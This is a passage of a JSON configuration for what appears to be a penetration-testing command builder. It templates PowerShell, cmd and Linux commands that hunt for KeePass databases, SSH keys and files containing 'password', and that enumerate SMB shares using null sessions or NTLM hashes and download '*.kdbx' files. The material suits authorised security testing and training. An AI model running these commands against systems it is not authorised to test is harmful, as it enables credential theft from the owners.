            "help": "Finding files based on their filename with a pattern is very powerful.\n\nSome common uses are:\n\n1. finding all files of a given extension eg `*.txt` to find all files with the extension of `.txt`\n2. finding all files containing a string in their name eg `*proof*` to find all files with the word `proof` in the filename\n\n> NOTE: this is inserted between single quotes, escape appropriately",
            "replace": "__LINUX_FIND_NAME_PATTERN__",
            "defaultValue": "*.txt",
            "props": {
              "type": "select",
              "label": "Find filename pattern",
              "customInput": true,
              "options": ["*.txt", "*.sh", "*.pub", "id_*", "*.kdbx", "*.py"]
            }
          }
        ]
      },
      {
        "win": 0,
        "label": "PowerShell Get-ChildItem",
        "platform": "windows",
        "terminal": ["ps", "cmd"],
        "allowTerminalWrap": true,
        "allowProxychains": true,
        "cmd": "Get-ChildItem __GCI_SILENT_ERRORS__ __GCI_FORCE_HIDDEN__ __GCI_SEARCH_ARGS__",
        "help": "",
        "code": [],
        "config": [
          {
            "help": "This list of options contains some common search tasks. The main goals are:\n\n1. find sensitive information eg credentials\n2. find other interesting files eg privilege escalation possibilities",
            "replace": "__GCI_SEARCH_ARGS__",
            "defaultValue": "-Recurse -Path __GCI_SEARCH_PATH__ -Include \"__GCI_INCLUDE_FILTER__\" -File",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "-Path __GCI_SEARCH_PATH__ -Include \"__GCI_INCLUDE_FILTER__\" __GCI_PRINT_FULLPATH_COMPACT__",
                  "label": "Custom Search"
                },
                {
                  "replace": "-Recurse -Path __GCI_SEARCH_PATH__ -Include \"__GCI_INCLUDE_FILTER__\" -File",
                  "label": "(Recurse) Find files via FILTER (eg, *.kdbx)"
                },
                {
                  "replace": "-Path C:\\ -Directory | Where-Object {$_.Name -notin @('$Recycle.Bin','$WinREAgent','Documents and Settings','PerfLogs','config.msi','Program Files','Program Files (x86)','Program Files (Arm)','ProgramData','Recovery','System Volume Information','Users','Windows')} | foreach-object { $_.FullName }",
                  "label": "List any non-standard C:\\ directories"
                },
                {
                  "replace": "-Path __GCI_SEARCH_PATH__ -Directory -Recurse | Where-Object {$_.Name -eq '.git' -or $_.Name -eq '.ssh'} | foreach-object { $_.FullName }",
                  "label": "(Recurse) Find all .git or .ssh folders at PATH"
                },
                {
                  "replace": "-Recurse -File -Path \"C:\\\" -filter \"*.exe\" | where-object {$_.FullName -notmatch 'C:\\\\Program Files' -and $_.FullName -notmatch 'C:\\\\Windows' -and $_.FullName -notmatch 'C:\\\\ProgramData' -and $_.FullName -notmatch '\\\\AppData\\\\'} | foreach-object { $_.FullName }",
                  "label": "Find all *.exe files NOT in Program Files dirs"
                },
                {
                  "replace": "-Recurse -File -Path \"C:\\\" -filter \"*.txt\" | where-object {$_.FullName -notmatch 'C:\\\\Program Files' -and $_.FullName -notmatch 'C:\\\\Windows' -and $_.FullName -notmatch 'C:\\\\ProgramData' -and $_.FullName -notmatch '\\\\AppData\\\\' -and $_.Name -Match \"local|proof|flag\"} | foreach-object { $_.FullName; cat $_.FullName }",
                  "label": "Find all TXT files with \"proof\", \"local\" or \"flag\" in the filename. Print full path and contents"
                },
                {
                  "replace": "-Path C:\\Users\\ -Include \"__GCI_INCLUDE_FILTER__\" -File -Recurse | foreach-object { $_.FullName }",
                  "label": "(Recurse) Enumerate files via INCLUDE FILTER in the PATH"
                },
                {
                  "replace": "-Recurse -File -Path __GCI_SEARCH_PATH__ -Include \"__GCI_INCLUDE_FILTER__\"  | foreach-object { $_.FullName; select-string -Path $_.FullName -pattern \"password\" -Context 1,1 }",
                  "label": "(Recurse) Search PATH for files with contents matching PATTERN (eg find \"password\" in a file)"
                },
                {
                  "replace": "-Recurse -Path __GCI_SEARCH_PATH__ | Where-Object {$_.CreationTime -gt (Get-Date).AddHours(-24) -and $_.FullName -notmatch 'C:\\\\Program Files' -and $_.FullName -notmatch 'C:\\\\Windows' -and $_.FullName -notmatch 'C:\\\\ProgramData' -and $_.FullName -notmatch '\\\\AppData\\\\'} | foreach-object { $_.FullName }",
                  "label": "(Recurse) Find all files or dirs that have been modified recently"
                }
              ],
              "label": "Select a search option"
            }
          },
          {
            "help": "Silently ignore and continue if an error such as `access denied` is encountered. This is often desired (and by default enabled) to reduce unnecessary verbosity of errors in the command output.",
            "replace": "__GCI_SILENT_ERRORS__",
            "defaultValue": true,
            "props": {
              "type": "checkbox",
              "label": "Enable silent errors (eg, suppress access denied error output)",
              "replaceValue": "-ErrorAction SilentlyContinue"
            }
          },
          {
            "help": "Where should the search take place on the hard drive? Pick carefully for certain commands as searching the entire drive can take a long time - albeit with the best potential results as well as the most chance for false-positives.",
            "replace": "__GCI_SEARCH_PATH__",
            "defaultValue": "C:\\Users\\",
            "props": {
              "type": "select",
              "label": "Search Path (aka file path to search)",
              "customInput": true,
              "options": ["C:\\Users\\", "C:\\", ".\\"]
            }
          },
          {
            "help": "Enabling this enables the `-Force` flag which tells Get-ChildItem to attempt finding any and all files no matter if they are hidden. This means a lot more will be searched and a lot more output is possible.\n\n> NOTE: some folders are by default hidden and this flag MUST be turned on to find them. Eg, `.git` folders are hidden by default!",
            "replace": "__GCI_FORCE_HIDDEN__",
            "defaultValue": true,
            "props": {
              "type": "checkbox",
              "label": "Find Hidden files and dirs",
              "replaceValue": "-Force"
            }
          },
          {
            "help": "The `-Include FILTER` allows for filtering on basic patterns. Eg, `*.*` will include ALL files found in the PATH searched (and if `-Recurse` is present, then all files are found recursively under the PATH provided)\n\nCommon extensions are provided as options to search quickly or provide your own custom input.\n\n[Powershell GCI Documentation on -Include](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-childitem?view=powershell-7.4#-include)",
            "replace": "__GCI_INCLUDE_FILTER__",
            "defaultValue": "*.*",
            "props": {
              "type": "select",
              "label": "Search filter (eg, *.kdbx includes all files with kdbx extension)",
              "customInput": true,
              "options": [
                "*.*",
                "*.kdbx",
                "*.txt",
                "*.py",
                "*.pub",
                "*.ps1",
                "*.bat",
                "*.exe"
              ]
            }
          },
          {
            "help": "This will append some PowerShell code that will print out the full path of the given items found. This is already included on many of the commands, however it's optional on the Custom Search option.\n\n```powershell\n# adds to the Get-ChildItem command (aka GCI) :\nGCI ... | foreach-object { $_.FullName }\n\n\n```",
            "replace": "__GCI_PRINT_FULLPATH_COMPACT__",
            "defaultValue": true,
            "props": {
              "type": "checkbox",
              "label": "Enable compact full path output for CUSTOM commands",
              "replaceValue": "| foreach-object { $_.FullName }"
            }
          }
        ]
      },
      {
        "win": 0,
        "label": "Finding in Cmd.exe without PowerShell",
        "platform": "windows",
        "terminal": ["cmd"],
        "allowTerminalWrap": true,
        "allowProxychains": false,
        "cmd": "__CMD_FILE_SEARCH__",
        "help": "# File Enumeration\n\nOne of the biggest sources of information for a pentester are the files that exist on a compromised machine. These commands aid in finding sensitive or interesting files.\n\nSpecifically these commands are intended to run using common programs that the Windows OS has, instead of relying on PowerShell. When possible, PS is often a better choice, but sometimes that isn't an option.",
        "code": [],
        "config": [
          {
            "help": "Windows OS ships with many default executable programs. This aims at helping select an alternative to PowerShell that will still do most of the functionality required for finding files.",
            "replace": "__CMD_FILE_SEARCH__",
            "defaultValue": "where __WHERE_INFO_ENABLED__ /R __CMD_SEARCH_PATH__ __CMD_SEARCH_FILTER__ __FINDSTR_IGNORE_ENABLED__",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "where __WHERE_INFO_ENABLED__ /R __CMD_SEARCH_PATH__ __CMD_SEARCH_FILTER__ __FINDSTR_IGNORE_ENABLED__",
                  "label": "WHERE.exe Recursive Search + ignore filtering"
                },
                {
                  "replace": "dir /S /B /A:D __CMD_SEARCH_PATH____CMD_SEARCH_FILTER__ __FINDSTR_IGNORE_ENABLED__",
                  "label": "Dir to find directories + ignore filter"
                },
                {
                  "replace": "for /r \"__CMD_SEARCH_PATH__\" %G in (__CMD_SEARCH_FILTER__) do @echo %G __FINDSTR_IGNORE_ENABLED__ __FOR_SEARCH_PRINT_CONTENTS__",
                  "label": "FOR recursive search + filtering + print contents"
                },
                {
                  "replace": "dir /S /B /A:D __CMD_SEARCH_PATH__*.git __CMD_SEARCH_PATH__*.ssh __FINDSTR_IGNORE_ENABLED__",
                  "label": "Dir to find all .git and .ssh directories + ignore filtering"
                },
                {
                  "replace": "dir /A:D /B C:\\ | findstr /i /V \"Recycle.Bin WinREAgent PerfLogs ProgramData Recovery Users Windows config.msi\" | findstr /i /V /R /C:\"Program Files\" | findstr /i /V /R /C:\"Documents and Settings\" | findstr /i /V /R /C:\"System Volume Information\"",
                  "label": "Print non-standard C:\\ root directories"
                }
              ],
              "label": "Select file enumeration option"
            }
          },
          {
            "help": "Where.exe has a flag `/T` that will display the `size`, `timestamp`, and `date` of the file.\n\n\nThis is printed in the format:\n\n```\n       filesize    Date    Time   Path\n       9   12/24/2020   11:12:13 AM   C:\\Users\\Public\\test.txt\n```",
            "replace": "__WHERE_INFO_ENABLED__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable extra info for WHERE.exe /T",
              "replaceValue": "/T"
            }
          },
          {
            "help": "This is the path which to search under on the filesystem. Common values are in the options list, and custom input is enabled to allow for any other path to be entered.",
            "replace": "__CMD_SEARCH_PATH__",
            "defaultValue": "C:\\",
            "props": {
              "type": "select",
              "label": "Path where the search should be ran",
              "customInput": true,
              "options": ["C:\\", "C:\\Users\\", ".\\"]
            }
          },
          {
            "help": "Search filter allows for defining the patterns of what files to look for eg `*.txt` for all files with a `.txt` extension\n\n> NOTE: To filter on multiple patterns use a space separator eg `*.txt *.bat` to search for files with either an extension of `.txt` or `.bat`",
            "replace": "__CMD_SEARCH_FILTER__",
            "defaultValue": "*flag*.txt *proof*.txt *local*.txt",
            "props": {
              "type": "select",
              "label": "Search filter (eg, *.txt for all files with extension txt)",
              "customInput": true,
              "options": [
                "*flag*.txt *proof*.txt *local*.txt",
                "*.kdbx",
                "id_*.pub id_*",
                "*.py",
                "*.bat",
                "*.ps1",
                "*.exe"
              ]
            }
          },
          {
            "help": "This will add onto the `FOR` command options. Enabling this means that the file path AND contents will be printed.\n\n> WARNING: This could cause a lot of stdout if the files have a lot of content",
            "replace": "__FOR_SEARCH_PRINT_CONTENTS__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable printing of contents of files found",
              "replaceValue": "&& type \"%G\""
            }
          },
          {
            "help": "## Findstr\n\nOn Windows OS, `findstr` operates similar to `grep` on Linux.\n\n`findstr` has a `/V` flag which accepts a pattern and will ONLY print the lines that do not match this pattern (similar to how `grep -v` works)\n\n## Pattern(s)\n\nHere are some pattern examples\n\n```batch\nREM this will NOT print the 'test' value\necho \"test\" | findstr /i /V \"test\"\n\nREM this will NOT print the echo'd text because the 'out' matched.\nREM in this findstr pattern, 'bob' does not match but the ' ' (space) character separates multiple patterns to attempt to match\necho \"testing this out\" | findstr /i /V \"bob out\"\n\nREM this will print as 'abc' does not match in the output of 'test'\necho \"test\" | findstr /i /V \"abc\"\n\n```",
            "replace": "__FINDSTR_IGNORE_ENABLED__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable findstr ignore pattern(s) for extra filtering",
              "replaceValue": "| findstr /i /V \"__FINDSTR_IGNORE_PATTERN__\""
            }
          },
          {
            "help": "Either supply a single pattern, or for multiple patterns separate them with a `space` character\n\neg `bob` for ignoring any output with `bob` in the text\n\neg `bob lisa` for ignoring any output with `bob` or `lisa` in the text\n\n> NOTE: this is case insensitive due to the `/i` flag",
            "replace": "__FINDSTR_IGNORE_PATTERN__",
            "defaultValue": "c:\\windows\\",
            "props": {
              "type": "select",
              "label": "Findstr ignore pattern(s)",
              "customInput": true,
              "options": ["\\appdata\\", "c:\\windows\\"]
            }
          }
        ]
      },
      {
        "win": 0,
        "label": "SMB enumeration in PowerShell",
        "platform": "windows",
        "terminal": ["ps", "cmd"],
        "allowTerminalWrap": true,
        "allowProxychains": false,
        "cmd": "__SMB_PS_CMD__",
        "help": "# SMB Enumeration via PowerShell\n\nSMB aka Network File Shares are very common to find when looking through an internal network. These commands help utilize PowerShell to mount and search through those shares for sensitive files.\n\n> TIP: Once access to the share is setup, consider utilizing any of the other PowerShell file enumeration searches provided in the `POWERSHELL GET-CHILDITEM` command builder.",
        "code": [
          {
            "data": "IyBnZXQgc21iIHNoYXJlcyB2aWEgbmV0IHZpZXcKIyB1c2FnZTogZ2V0LXNoYXJlcyAtc2VydmVyIFNFUlZFUl9OQU1FCmZ1bmN0aW9uIGdldC1zaGFyZXMgewogIHBhcmFtKFtzdHJpbmddJHNlcnZlcikKICByZXR1cm4gKG5ldCB2aWV3ICRzZXJ2ZXIgfCBXaGVyZS1PYmplY3QgeyAkXyAtbWF0Y2ggJ1xzRGlza1xzJyB9KSAtcmVwbGFjZSAnXHNccysnLCAnLCcgfCBGb3JFYWNoLU9iamVjdHsgCiAgICAkc2hhcmVOYW1lID0gKCRfIC1zcGxpdCAnLCcpWzBdCiAgICBbUHNDdXN0b21PYmplY3RdQHsKICAgICAgICBzaGFyZVBhdGggPSAiXFwkc2VydmVyXCRzaGFyZU5hbWUiCiAgICAgICAgaG9zdG5hbWUgPSAiJHNlcnZlciI7CiAgICAgICAgc2hhcmUgPSAkc2hhcmVOYW1lOwogICAgfQogIH0KfQ==",
            "filename": "get-shares.ps1",
            "sha256": "0f1bdfc5aa22aa1b9119d6ed01b234b8e10df908952ccdf19203cb03027546f8"
          }
        ],
        "config": [
          {
            "help": "# SMB Shares\n\nFile shares are very common to find. These steps will help guide you through the process of discovery and enumeration.\n\nThis is specifically relating to PowerShell on Windows. There is a Linux version of this information as well.\n\n## Definitions\n\n1. `Discovery` in this context means to find a share that wasn't previously found. Often discovery happens by checking all of the IPv4 range or hostnames that are found in the network (or other sources such as Active Directory)\n2. `File Enumeration` in this context means to find all of the files on a given share (or folder location). Finding a file means that it's location and contents are available. This step often requires running several commands or one very large command to find a set of interesting files (eg, first search for `*.kdbx` files, then search for `.git` folders, lastly search for the string `password` in all `*.txt` files)\n\n> TIP: There is another section for File Enumeration (eg `POWERSHELL GET-CHILDITEM`) that contains more enumeration than this section. Be sure to run all the enumeration commands to gain as much info as possible.",
            "replace": "__SMB_PS_CMD__",
            "defaultValue": "__SMB_ENUM_SHARES__",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "__SMB_ENUM_SHARES__",
                  "label": "Step 1: Enumerate the available share(s)"
                },
                {
                  "replace": "New-PSDrive -Name \"__SMB_MOUNT_NAME__\" -PSProvider \"FileSystem\" -Root \"\\\\__SMB_TARGET_HOSTNAME__\\__SMB_SHARE_NAME__\"",
                  "label": "Optional: Mount share"
                },
                {
                  "replace": "__SMB_ENUM_FILES__",
                  "label": "Step 2: Enumerate Files on Share"
                }
              ],
              "label": "Select Option to run"
            }
          },
          {
            "help": "",
            "replace": "__SMB_ENUM_SHARES__",
            "defaultValue": "net view __SMB_TARGET_HOSTNAME__",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "net view __SMB_TARGET_HOSTNAME__",
                  "label": "net view Hostname/IPv4"
                },
                {
                  "replace": "get-shares -server __SMB_TARGET_HOSTNAME__",
                  "label": "Get-Shares.ps1 Custom PS1"
                }
              ],
              "label": "Select a SMB Share Enumeration option"
            }
          },
          {
            "help": "Enter the `hostname` or `IPv4` address for the computer that hosts the file shares or for a computer which needs to have any smb shares enumerated\n\nThe default is the `__TARGET_HOST__` which is the global tool to enter a target IPv4 at the top of the page.",
            "replace": "__SMB_TARGET_HOSTNAME__",
            "defaultValue": "__TARGET_HOST__",
            "props": {
              "type": "select",
              "label": "Smb Hostname or IPv4 Address",
              "customInput": true,
              "options": ["__TARGET_HOST__"]
            }
          },
          {
            "help": "## Definitions\n\n1. `SMB Mount Name` is the name assigned to the share when it's mounted on the local machine. Eg, mounting a share with a mount name of 'foo' means on the local machine 'foo' is used to access the contents of the share - irrespective of what the share is named\n2. `SMB Share Name` is the name assigned on the computer which hosts the share. Discovering a share on a computer means to discover the share name. All shares on a single computer must have a unique name.\n\n> NOTE: the option `__SMB_SHARE_NAME__` is available to quickly mount as the same name as the share so that less confusion can happen. Typically a naming convention with proper context is ideal, so it's clear which share the information found comes from.",
            "replace": "__SMB_MOUNT_NAME__",
            "defaultValue": "share1",
            "props": {
              "type": "select",
              "label": "Smb Mount Name",
              "customInput": true,
              "options": ["share1", "__SMB_SHARE_NAME__"]
            }
          },
          {
            "help": "## Definitions\n\n1. `SMB Mount Name` is the name assigned to the share when it's mounted on the local machine. Eg, mounting a share with a mount name of 'foo' means on the local machine 'foo' is used to access the contents of the share - irrespective of what the share is named\n2. `SMB Share Name` is the name assigned on the computer which hosts the share. Discovering a share on a computer means to discover the share name. All shares on a single computer must have a unique name.\n\n> NOTE: The included options are defaults for Windows Shares commonly found in Active Directory environments. Custom input is enabled to input any other share name.",
            "replace": "__SMB_SHARE_NAME__",
            "defaultValue": "SYSVOL",
            "props": {
              "type": "select",
              "label": "Smb Share Name",
              "customInput": true,
              "options": [
                "C$",
                "D$",
                "IPC$",
                "ADMIN$",
                "NETLOGON",
                "SYSVOL",
                "PRINT$",
                "FAX$"
              ]
            }
          },
          {
            "help": "`dir` can be used on windows to list the contents of an SMB Share.\n\nPowerShell `Get-ChildItem` can list the contents of a Mounted SMB Share by using the SMB Mount Name as a Drive Letter eg `C:\\` is a drive letter, however mount names can be more than a single letter eg `mountname:\\`\n\nSee the Command `POWERSHELL GET-CHILDITEM` for more.",
            "replace": "__SMB_ENUM_FILES__",
            "defaultValue": "dir \"\\\\__SMB_TARGET_HOSTNAME__\\__SMB_SHARE_NAME__\"",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "dir \"\\\\__SMB_TARGET_HOSTNAME__\\__SMB_SHARE_NAME__\"",
                  "label": "Dir an SMB share"
                },
                {
                  "replace": "Get-ChildItem -Path '__SMB_MOUNT_NAME__:\\'",
                  "label": "PS List contents of mounted share (PSDrive)"
                }
              ],
              "label": "Select File Enumeration Option"
            }
          }
        ]
      },
      {
        "win": 0,
        "label": "SMB enumeration from Kali (linux)",
        "platform": "linux",
        "terminal": ["sh", "bash"],
        "allowTerminalWrap": true,
        "allowProxychains": true,
        "cmd": "__SMB_ENUM_KALI__",
        "help": "# SMB Enumeration from Kali Linux\n\nIt's common to find Smb file shares in a pentest. This command attempts to help enumeration of these shares using linux based tools.",
        "code": [],
        "config": [
          {
            "help": "## Choose an option\n\nChoose a command option to configure. Here is some basic info about each:\n\n### Helpful Tips\n\n1. Try `anonymous login` as well as any `credentials` found\n2. Try multiple tools to confirm results and/or to try different tasks. Some tools do not support the features of other tools.\n\n## Enum4Linux\n\nThis tool helps enumerate smb via several options and is often a good way to get a lot of info quickly.\n\n## Smbmap\n\nThis tool has some basic features but things like `recursion` are quite limited or appear to be broken. Still it's a common tool to see for smb enumeration so it's included here.\n\n## Smbclient\n\nSamba is a free linux implementation of SMB and this tool allows for an FTP-like interface to an Smb share. This can do most any feature, the syntax just needs to be sorted out. One really nice feature is it's ability to download files based on a pattern from the file share. This can be very powerful when there are possible file extensions to target in the environment or when specific interesting filenames might exist.\n\n## Mounting the Smb share and using other common tools\n\nAn often overlooked side of file enumeration with Smb shares is the ability to mount the share to a local folder and then use common tools like `find` or `grep` to search for the interesting pieces. While this won't be as fast as having a local downloaded copy, it's still a powerful option as the regular file enumeration tools can be used.\n\n> TIP: Don't forget to cleanup the share aka `unmount` when finished.\n\n\n",
            "replace": "__SMB_ENUM_KALI__",
            "defaultValue": "enum4linux -a __SMB_TARGET_HOSTNAME__",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "enum4linux -a __SMB_TARGET_HOSTNAME__",
                  "label": "Enum4linux"
                },
                {
                  "replace": "__SMB_SMBCLIENT_CMD__",
                  "label": "Smbclient"
                },
                {
                  "replace": "smbmap --no-banner -H __SMB_TARGET_HOSTNAME__ __SMBMAP_AUTH__ -s '__SMB_SHARE_NAME__' __SMBMAP_RECURSE__",
                  "label": "Smbmap"
                },
                {
                  "replace": "__SMB_MOUNT_CMD__",
                  "label": "Mount SMB Share to local dir then use tools like 'find'"
                }
              ],
              "label": "Select an option"
            }
          },
          {
            "help": "This will help get the Smb share mounted to a local directory on your Linux computer.\n\n> TIP: Try the commands in `Find on Linux` for all the file enumeration options that pair nicely when mounting an Smb share.\n\n\n> NOTE: `proxychains` usage on the `mount` command did not work in testing. If you have a working command for mounting an Smb share through an ssh or other tunnel, please make a PR on Github for this project!",
            "replace": "__SMB_MOUNT_CMD__",
            "defaultValue": "sudo mkdir -p '__SMB_MOUNT_DIR__'",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "sudo mkdir -p '__SMB_MOUNT_DIR__'",
                  "label": "Step 1. mkdir for where to mount the share"
                },
                {
                  "replace": "sudo mount -t cifs __SMB_MOUNT_AUTH__ //__SMB_TARGET_HOSTNAME__/__SMB_SHARE_NAME__ '__SMB_MOUNT_DIR__'",
                  "label": "Step 2. Mount the smb share at the local directory"
                },
                {
                  "replace": "sudo umount -l '__SMB_MOUNT_DIR__'",
                  "label": "Step 3. Cleanup when finished aka unmount"
                }
              ],
              "label": "Mounting an Smb share"
            }
          },
          {
            "help": "[Smbclient Commands Documentation](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)\n\n",
            "replace": "__SMB_SMBCLIENT_CMD__",
            "defaultValue": "smbclient __SMBCLIENT_AUTH__ -L //__SMB_TARGET_HOSTNAME__",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "smbclient __SMBCLIENT_AUTH__ -L //__SMB_TARGET_HOSTNAME__",
                  "label": "List share names"
                },
                {
                  "replace": "smbclient __SMBCLIENT_AUTH__ //__SMB_TARGET_HOSTNAME__/__SMB_SHARE_NAME__ --directory '__SMB_REMOTE_PATH__' -c '__SMBCLIENT_CARGS__'",
                  "label": "enable smbclient commands eg, get/put/mget/mput and recurse"
                }
              ],
              "label": "Smbclient task options"
            }
          },
          {
            "help": "Smbmap recursion is quite flaky, ensure that another tool is tested as well before results are considered accurate.",
            "replace": "__SMBMAP_RECURSE__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Smbmap enable recurse",
              "replaceValue": "-r '__SMB_REMOTE_PATH__'"
            }
          },
          {
            "help": "## Authentication options\n\n1. `username + password + domain` requires that credentials are known. The `domain` can be defaulted to `WORKGROUP` or enter the AD domain. The `password` can be either a plaintext password or an NTLM password hash\n2. Null session requires the use of a username that doesn't exist. A very random username is supplied that isn't likely to exist in an environment, and custom input is enabled to allow changing this",
            "replace": "__SMBMAP_AUTH__",
            "defaultValue": "-u '__USERNAME__' -p '__PASSWORD__' -d '__DOMAIN__'",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "-u '__USERNAME__' -p '__PASSWORD__' -d '__DOMAIN__'",
                  "label": "Username + Password or NTLM Hash + Domain/Workgroup"
                },
                {
                  "replace": "-u '__USERNAME__' -p '__NTLM_PASSWORD_HASH__' -d '__DOMAIN__'",
                  "label": "Username + NTLM Hash + Domain/Workgroup"
                },
                {
                  "replace": "-u '__SMBMAP_NULL_USER__'",
                  "label": "Null session"
                }
              ],
              "label": "Smbmap authentication options"
            }
          },
          {
            "help": "Enter the `hostname` or `IPv4` address for the computer that hosts the file shares or for a computer which needs to have any smb shares enumerated\n\nThe default is the `__TARGET_HOST__` which is the global tool to enter a target IPv4 at the top of the page.",
            "replace": "__SMB_TARGET_HOSTNAME__",
            "defaultValue": "__TARGET_HOST__",
            "props": {
              "type": "select",
              "label": "Smb Hostname or IPv4 Address",
              "customInput": true,
              "options": ["__TARGET_HOST__"]
            }
          },
          {
            "help": "## Definitions\n\n1. `SMB Share Name` is the name assigned on the computer which hosts the share. Discovering a share on a computer means to discover the share name. All shares on a single computer must have a unique name.\n\n> NOTE: The included options are defaults for Windows Shares commonly found in Active Directory environments. Custom input is enabled to input any other share name.",
            "replace": "__SMB_SHARE_NAME__",
            "defaultValue": "SYSVOL",
            "props": {
              "type": "select",
              "label": "Smb Share Name",
              "customInput": true,
              "options": [
                "C$",
                "D$",
                "IPC$",
                "ADMIN$",
                "NETLOGON",
                "SYSVOL",
                "PRINT$",
                "FAX$"
              ]
            }
          },
          {
            "help": "On the SMB share, the remote path means the path on the share itself, from the root of the share.\n\nConsider the following UNC path: `\\\\remote-computer\\share-name\\remote-path\\here`\n\nThe components breakdown into:\n\n1. `remote-computer` is the name or ip address of the computer being connected to which hosts the shared folder/data\n2. `share-name` is the name of the share, this contains the folder/data\n3. `remote-path\\here` is the path to a given file or folder on the remote smb share.",
            "replace": "__SMB_REMOTE_PATH__",
            "defaultValue": "",
            "validationRegex": "",
            "validationHelp": "",
            "props": {
              "type": "string",
              "label": "Remote Path inside share"
            }
          },
          {
            "help": "Smbmap doesn't provide an option to tell it to use a null username, so the alternative solution is to use a username that doesn't exist. The default is `notarealuser` but any value can be provided. Another option is to select the current global username.",
            "replace": "__SMBMAP_NULL_USER__",
            "defaultValue": "notarealuser",
            "props": {
              "type": "select",
              "label": "Smbmap Null Username",
              "customInput": true,
              "options": ["notarealuser", "__USERNAME__"]
            }
          },
          {
            "help": "",
            "replace": "__SMBCLIENT_AUTH__",
            "defaultValue": "--user='__SMBCLIENT_DOMAIN_AUTH____USERNAME__' --password='__PASSWORD__'",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "--user='__SMBCLIENT_DOMAIN_AUTH____USERNAME__' --password='__PASSWORD__'",
                  "label": "Username + Password (domain optional)"
                },
                {
                  "replace": "--no-pass",
                  "label": "Null session - no password"
                },
                {
                  "replace": "--user='__SMBCLIENT_DOMAIN_AUTH____USERNAME__' --password='__PASSWORD__' --pw-nt-hash",
                  "label": "Username + NTLM Password Hash (domain optional)"
                }
              ],
              "label": "Smbclient Auth options"
            }
          },
          {
            "help": "",
            "replace": "__SMBCLIENT_DOMAIN_AUTH__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Smbclient enable Domain/Workgroup in auth",
              "replaceValue": "__DOMAIN__/"
            }
          },
          {
            "help": "Smbclient has an ftp-like interface for interacting with an Smb share. These commands can be scripted out, or provided interactively. This option sets the commands to run in 'scripted' mode - aka non-interactive commands.\n\nThis is powerful as it allows recursive downloading of specific files, recursive directory listings, and even a fully custom input option is available.",
            "replace": "__SMBCLIENT_CARGS__",
            "defaultValue": "dir ./*",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "recurse;ls",
                  "label": "Recursive list all files/folders"
                },
                {
                  "replace": "prompt;recurse;mask \"*.kdbx\";mget *",
                  "label": "Recursive download of all *.KDBX files"
                },
                {
                  "replace": "dir ./*",
                  "label": "List directory contents"
                },
                {
                  "replace": "get Database.kdbx",
                  "label": "Download a single file via path"
                },
                {
                  "replace": "__SMBCLIENT_CUSTOM_CARGS__",
                  "label": "Custom command"
                }
              ],
              "label": "Smbclient command arg options"
            }
          },
          {
            "help": "See [Smbclient Docs](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html) for the various command options such as `get`, `mget`, `recurse`, etc.",
            "replace": "__SMBCLIENT_CUSTOM_CARGS__",
            "defaultValue": "",
            "validationRegex": "",
            "validationHelp": "",
            "props": {
              "type": "string",
              "label": "Smbclient custom command script args"
            }
          },
          {
            "help": "When mounting a remote smb share onto the local filesystem, a local path must be given. This path must already exist for the mount command to succeed. Common paths are provided in the drop-down options",
            "replace": "__SMB_MOUNT_DIR__",
            "defaultValue": "/mnt/__SMB_SHARE_NAME__",
            "props": {
              "type": "select",
              "label": "Smb Mount Local Directory",
              "customInput": true,
              "options": [
                "/mnt/smb_share",
                "/mnt/__SMB_SHARE_NAME__",
                "/media/smb_share",
                "/media/__SMB_SHARE_NAME__"
              ]
            }
          },
          {
            "help": "",
            "replace": "__SMB_MOUNT_AUTH__",
            "defaultValue": "-o 'username=__USERNAME__,password=__PASSWORD__'",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "-o 'username=__USERNAME__'",
                  "label": "Username only (use any user for the null session)"
                },
                {
                  "replace": "-o 'username=__USERNAME__,password=__PASSWORD__'",
                  "label": "Username + Password"
                },
                {
                  "replace": "-o 'username=__USERNAME__,password=__PASSWORD__,domain=__DOMAIN__'",
                  "label": "Username + Password + Domain/Workgroup"
                }
              ],
              "label": "Smb mount authentication options"
            }
          }
        ]
      }
    ]
  },
  {
    "id": "git-repository",
    "keywords": ["download", "wget", ".git", "repository", "version control"],
    "cmds": [
      {
        "win": 0,
        "label": "Git Repos",
        "platform": "linux|windows",
        "terminal": ["ps", "cmd", "sh", "bash"],
        "allowTerminalWrap": true,
        "allowProxychains": false,
        "cmd": "__GIT_COMMAND__",
        "help": "# Git - version control\n\nGit is a very useful technology for developers. As pentesters, finding a git repo can be really helpful. Mainly, there is a full history of all changes within the code - and if any dev has messed up and committed something they shouldn't it can be found.\n\nGo through the options to see what might quickly pop for interesting info.\n\n## NOTE 1 - Git status reports the current user doesn't own the repo\n\nIf you get an error from git, often there is output to help move forward. One common issue could be that as a pentester, a foothold on a machine is done through a different account than the user account which setup the git repo. In that case an error about `unsafe repository` or `ownership` issues can be shown. Try to follow with the suggestions of git when this happens, and the `Git config add directory as safe` option to potentially fix the error and allow git to work again.",
        "code": [],
        "config": [
          {
            "help": "",
            "replace": "__GIT_COMMAND__",
            "defaultValue": "git status",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "git config --global --add safe.directory '__GIT_DIRECTORY_PATH__'",
                  "label": "Git config add directory as safe"
                },
                {
                  "replace": "git status",
                  "label": "git status"
                },
                {
                  "replace": "git show __GIT_HASH__",
                  "label": "git show last commit (optionally specify hash)"
                },
                {
                  "replace": "git log__GIT_LOG_STAT__",
                  "label": "git log"
                },
                {
                  "replace": "git branch -a",
                  "label": "git branch -a"
                }
              ],
              "label": "Select an option"
            }
